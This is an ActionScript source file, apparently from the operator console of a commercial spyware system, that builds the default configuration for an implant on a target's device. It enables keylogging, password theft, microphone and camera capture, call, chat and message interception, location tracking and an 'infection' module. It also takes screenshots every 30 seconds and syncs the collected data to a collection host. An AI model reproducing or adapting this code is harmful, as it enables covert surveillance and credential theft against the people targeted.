package it.ht.rcs.console.operations.view.configuration
{
  import it.ht.rcs.console.agent.model.Agent;
  
  import mx.collections.ArrayCollection;
  
  public class DefaultConfigBuilder
  {
    
    private static var agent:Agent;
    
    public static function getNewConfig(a:Agent):Object
    {
      agent = a;
      
      var config:Object = {};
      config.modules = getModules();
      config.events = [{desc: "SCREENSHOT", delay: 30}];
      config.actions = [{desc: "STARTUP", subactions: [{action: "module", module: "call"}, {action: "module", module: "chat"}, {action: "module", module: "mouse"}] },
                        {desc: "SYNC",    subactions: [{action: "synchronize", host: "192.168.100.100"}] }];
      config.globals = getGlobals();
      
      return config;
    }
    
    private static function getModules():Array
    {
      
      var modules:Array = [
        {
          module: "application",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "call",
          calllist: true,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "camera",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "chat",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "clipboard",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "crisis",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "device",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "file",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "infection",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "keylog",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "messages",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mic",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mouse",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "addressbook",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "calendar",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "password",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "position",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "print",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "snapshot",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "url",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        }
      ];
      
      var ac:ArrayCollection = new ArrayCollection(modules);
      ac.filterFunction = moduleFilterFunction;
      ac.refresh();
      
      var filteredModules:Array = ac.toArray();
      for each (var m:Object in filteredModules) {
        delete m._type;
        delete m._platform;
      }
      
      return filteredModules;
      
    }
    
    private static function moduleFilterFunction(item:Object):Boolean
    {
      return item._type.indexOf(agent.type) != -1 && item._platform.indexOf(agent.platform) != -1;
    }
    
    private static function getGlobals():Object
    {
      
      var globals:Object = {
                             quota: { "min": 524288000, "max": 1048576000 },
                             wipe: false,
                             type: agent.type,
                             advanced: false
                           };
      
      return globals;
      
    }
    
  }
  
}